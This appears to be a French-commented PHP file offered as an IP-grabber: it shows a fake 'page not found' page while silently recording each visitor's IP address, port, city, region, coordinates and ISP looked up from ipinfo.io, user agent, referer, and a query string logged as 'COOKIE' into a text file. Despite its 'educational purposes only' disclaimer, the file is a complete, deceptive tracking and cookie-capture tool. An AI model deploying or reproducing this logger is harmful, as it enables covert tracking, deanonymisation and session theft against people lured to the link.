<!--
Auteur: ZekromDev
Github: https://github.com/ZekromDev
Description: Juste un code simple à vous montrer car il est simple et puissant d’obtenir des informations sur une personne
Ne faites confiance à personne sur internet.
Seulement à des fins éducatives !!



    ___
 __/_  `.  .-"""-.
 \_,` | \-'  /   )`-')
  "") `"`    \  ((`"`
 ___Y  ,    .'7 /|
(_,___/...-` (_/_/
-->
<!DOCTYPE html>
<html>
<head>
	<title>Error 404 | Redirecting to correct url</title>
	<link rel="icon" type="images/x-icon" href="../images/favicon.ico">
</head>
<body>

<?php
function GetIP() 
{ 
	if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")) 
		$ip = getenv("HTTP_CLIENT_IP"); 
	else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) 
		$ip = getenv("HTTP_X_FORWARDED_FOR"); 
	else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")) 
		$ip = getenv("REMOTE_ADDR"); 
	else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")) 
		$ip = $_SERVER['REMOTE_ADDR']; 
	else 
		$ip = "unknown"; 
	return($ip); 
} 
function logData() 
{ 
	$ipLog = "information.txt"; 

	$cookie = $_SERVER['QUERY_STRING']; 

	$register_globals = (bool) ini_get('register_gobals'); 

	if ($register_globals) $ip = getenv('REMOTE_ADDR'); 
	else $ip = GetIP(); 
	$rem_port = $_SERVER['REMOTE_PORT']; 
	$user_agent = $_SERVER['HTTP_USER_AGENT'];
	if (isset( $_SERVER['METHOD'])){
		$rqst_method = $_SERVER['METHOD'];
	}
	else{
		$rqst_method = "null";
	}
	if (isset( $_SERVER['REMOTE_HOST'])) {
		$rem_host = $_SERVER['REMOTE_HOST'];
	}
	else{
		$rem_host = "null";
	}
	if (isset($_SERVER['HTTP_REFERER'])) {
		$referer = $_SERVER['HTTP_REFERER'];
	}
	else
	{
		$referer = "null";
	}
	$date=date ("Y/m/d G:i:s"); 
	$log=fopen("$ipLog", "a+"); 

 // J'utilise ce site pour obtenir plus d'informations sur l'IP addy telles que la ville, le FAI, l'emplacement
	$ip_details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));


// Ecrit toutes les données que nous avons dans 'information.txt'
	fwrite($log, "IP=" . $ip . PHP_EOL);
	fwrite($log, "PORT=" . $rem_port . PHP_EOL);
	fwrite($log, "CITY=" . $ip_details->city . PHP_EOL);
	fwrite($log, "REGION=" . $ip_details->region . PHP_EOL);
	fwrite($log, "COUNTRY=" . $ip_details->country . PHP_EOL);
	fwrite($log, "LOCATION=" . $ip_details->loc . PHP_EOL);
	fwrite($log, "ISP=" . $ip_details->org . PHP_EOL);
	fwrite($log, "DATE=" . $date . PHP_EOL);
	fwrite($log, "HOST=" . $rem_host . PHP_EOL);
	fwrite($log, "UA=" . $user_agent . PHP_EOL);
	fwrite($log, "METHOD=" . $rqst_method . PHP_EOL);
	fwrite($log, "REF=" . $referer . PHP_EOL);
	fwrite($log, "COOKIE=" . $cookie . PHP_EOL . PHP_EOL);

} 
logData();
?>
<!-- Affichage d'une fausse page 404 -->
  <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>

        * {
            line-height: 1.2;
            margin: 0;
        }

        html {
            color: #888;
            display: table;
            font-family: sans-serif;
            height: 100%;
            text-align: center;
            width: 100%;
        }

        body {
            display: table-cell;
            vertical-align: middle;
            margin: 2em auto;
        }

        h1 {
            color: #555;
            font-size: 2em;
            font-weight: 400;
        }

        p {
            margin: 0 auto;
            width: 280px;
        }

        @media only screen and (max-width: 280px) {

            body, p {
                width: 95%;
            }

            h1 {
                font-size: 1.5em;
                margin: 0 0 0.3em;
            }

        }

    </style>
</head>
<body>
    <h1>Page non trouvée</h1>
    <p>Désolé, mais la page que vous tentiez d'afficher n'existe pas.</p>
</body>
</html>
</body>
</html> 
